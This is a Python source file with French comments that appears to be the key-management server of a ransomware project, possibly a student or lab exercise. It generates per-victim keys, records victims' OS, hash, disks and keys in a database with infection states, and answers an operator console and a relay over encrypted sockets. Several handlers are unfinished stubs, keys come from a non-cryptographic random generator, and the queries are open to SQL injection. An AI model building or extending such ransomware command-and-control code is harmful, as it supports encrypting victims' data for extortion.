from threading import Thread
import queue
import string
import random
import utile.network as network
import utile.message
import utile.data as data
import utile.security as security
import utile.config as config

load = config.load_config('../configuration/config/serveur_cles.cfg', '../configuration/config/serveur_cles.key')
AES_GCM = config.get_config('AES_GCM')
DEBUG_MODE = config.get_config('DEBUG_MODE')
PORT_SERV_CONSOLE = int(config.get_config('PORT_SERV_CONSOLE'))
PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))


def generate_key(longueur=0, caracteres=string.ascii_letters + string.digits):
    return ''.join(random.choice(caracteres) for i in range(longueur))

def ajout_victim(db, id, os, disk, key):
    # Insérer les données de la victime dans la table 'victims'
    data.insert_data(db, 'victims', '(os, hash, disks, key)', f'("{os}", "{id}", "{disk}", "{key}")')
    # Sélectionner l'ID de la victime en fonction de son hash
    id_victim = data.select_data(db, f'SELECT id_victim FROM victims WHERE hash = "{id}"')[0][0]
    # Insérer l'état INITIALIZE pour la victime dans la table 'states'
    data.insert_data(db, 'states', '(id_victim, state)', f'({id_victim}, "INITIALIZE")')
    # Retourner l'ID de la victime
    return id_victim


def main():
    """
    Fonction principale du programme.
    Elle initialise la communication avec la base de données, crée des files d'attente pour les réponses,
    et lance deux threads pour traiter les requêtes provenant du frontal et de la console.
    """
    connexion_db = data.connect_db()  # Connexion à la base de données
    fifo_db = queue.Queue()  # File d'attente pour les requêtes vers la base de données
    fifo_rep_front = queue.Queue()  # File d'attente pour les réponses vers le frontal
    fifo_rep_console = queue.Queue()  # File d'attente pour les réponses vers la console

    # Lancement des threads pour traiter les requêtes
    thread_front = Thread(target=thread_frontal, args=(fifo_db, fifo_rep_front), daemon=True).start()
    thread_cons = Thread(target=thread_console, args=(fifo_db, fifo_rep_console), daemon=True).start()

    while True:
        msg = fifo_db.get()  # Récupération du message depuis la file d'attente
        msg_type = utile.message.get_message_type(msg)  # Obtention du type de message

        # Traitement en fonction du type de message
        if msg_type == 'LIST_VICTIM_REQ':
            print("Type du msg : " + str(msg_type))
            list_victim = data.get_list_victims(connexion_db)
            for victim in list_victim:
                msg = utile.message.set_message('list_victim_resp', victim)
                fifo_rep_console.put(msg)
                fifo_rep_console.join()
                # Fin de boucle on envoit list_victime_end dans la queue fifo de reponse console
            msg = utile.message.set_message('list_victim_end')
            fifo_rep_console.put(msg)
            fifo_rep_console.join()
            fifo_db.task_done()
        if msg_type == 'HISTORY_REQ':
            print("Historique de la victime")
        if msg_type == 'CHANGE_STATE':
            print("Changement d'état")


def thread_console(fifo_db, fifo_rep_console):
    """
    Fonction exécutée dans un thread séparé pour traiter les requêtes provenant de la console.
    Elle attend les requêtes, les déchiffre et les traite, puis envoie les réponses.
    """
    server_socket = network.start_net_serv(port=PORT_SERV_CONSOLE)
    while True:
        socket_console, _ = server_socket.accept()
        while True:
            aes_key = security.diffie_hellman_send_key(socket_console)
            with open('config/key.bin', 'wb') as f:
                f.write(aes_key)
            message = network.receive_message(socket_console)
            message = security.aes_decrypt(message, aes_key)
            print("Message décrypté" + str(message))
            msg_type = utile.message.get_message_type(message)
            print(f"Message du client : {message}")
            print(f"Type : {msg_type}")
            if msg_type == 'LIST_VICTIM_REQ':
                fifo_db.put(message) # Dans la file d'attente db on envoit le message LIST_VICTIM_REQ
                message = fifo_rep_console.get() #On récupere le message qu'envoit le serveur clé qui est dans la file d'attente
                msg_type = utile.message.get_message_type(message)
                while msg_type != 'LIST_VICTIM_END':
                    message = security.aes_encrypt(message, aes_key)
                    network.send_message(socket_console, message)
                    fifo_rep_console.task_done()
                    message = fifo_rep_console.get()
                    msg_type = utile.message.get_message_type(message)
                message = security.aes_encrypt(message, aes_key)
                network.send_message(socket_console, message)
                fifo_rep_console.task_done()


def thread_frontal(fifo_db, fifo_rep_front):
    """
    Fonction exécutée dans un thread séparé pour traiter les requêtes provenant du frontal.
    Elle attend les requêtes, les déchiffre et les traite, puis envoie les réponses.
    """
    s_serveur = network.start_net_serv(port=PORT_SERV_FRONTAL)
    while True:
        socket_front, _ = s_serveur.accept()
        aes_key = security.diffie_hellman_send_key(socket_front)
        print("Clé : " + str(aes_key))
        while True:
            msg = network.receive_message(socket_front)
            msg = security.aes_decrypt(msg, aes_key)
            msg_type = utile.message.get_message_type(msg)
            if msg_type == 'INITIALIZE_REQ':
                fifo_db.put(msg)
                msg = fifo_rep_front.get()
                msg_type = utile.message.get_message_type(msg)
                if msg_type == 'INITIALIZE_KEY':
                    msg = security.aes_encrypt(msg, aes_key)
                    network.send_message(socket_front, msg)
                    fifo_rep_front.task_done()


# Appel de la fonction principale
if __name__ == "__main__":
    main()